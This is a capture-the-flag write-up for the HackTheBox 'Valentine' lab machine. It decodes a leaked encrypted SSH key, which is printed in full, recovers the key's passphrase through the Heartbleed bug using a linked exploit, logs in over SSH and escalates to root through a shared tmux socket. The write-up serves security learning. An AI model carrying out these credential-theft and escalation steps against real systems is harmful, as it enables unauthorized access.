In the /dev folder we found a encoded file (hexadecimal) which once decoded gives us a ssh encrypted key file

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Valentine-10.10.10.79]
└─$ wget http://10.10.10.79/dev/hype_key
```

Now decode it

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Valentine-10.10.10.79]
└─$ cat hype_key | xxd -r -p > hype_key_encrypted

┌──(kali㉿kali)-[~/Documents/Boxes/Valentine-10.10.10.79]
└─$ cat hype_key_encrypted 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

To decrypt it we need a pass phrase that we don't have so lets dig more in the webapp. Running nmap script vuln (`--script vuln`) we found that the webapp is vulnerable to Heartbleed (CVE-2014-0160) so we use **[this exploit](https://gist.github.com/eelsivart/10174134)** and retrieve the base64 encoded pass `aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==` which once decoded gives us the pass `heartbleedbelievethehype`

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Valentine-10.10.10.79]
└─$ openssl rsa -in hype_key_encrypted -out hype_key_decrypted
Enter pass phrase for hype_key_encrypted: heartbleedbelievethehype
writing RSA key

┌──(kali㉿kali)-[~/Documents/Boxes/Valentine-10.10.10.79]
└─$ ssh -i hype_key_decrypted hype@10.10.10.79                           
Enter passphrase for key 'id_rsa': 
sign_and_send_pubkey: no mutual signature supported
hype@10.10.10.79s password: 
Permission denied, please try again.
```

We are getting the error 'no mutual signature supported', which after some google we find that we can avoid running ssh with the flag `-oPubkeyAcceptedAlgorithms=+ssh-rsa`

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Valentine-10.10.10.79]
└─$ ssh -oPubkeyAcceptedAlgorithms=+ssh-rsa -i hype_key_decrypted hype@10.10.10.79
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ whoami
hype
```

And we are in. Checking with pspy64 we found that the user root executes the command `/usr/bin/tmux -S /.devs/dev_sess` and after some searching we found that we can escalate privileges executing the same command with our user to spawn a root shell

```bash
hype@Valentine:~$ /usr/bin/tmux -S /.devs/dev_sess

root@Valentine:/home/hype# whoami
root
```

And we are root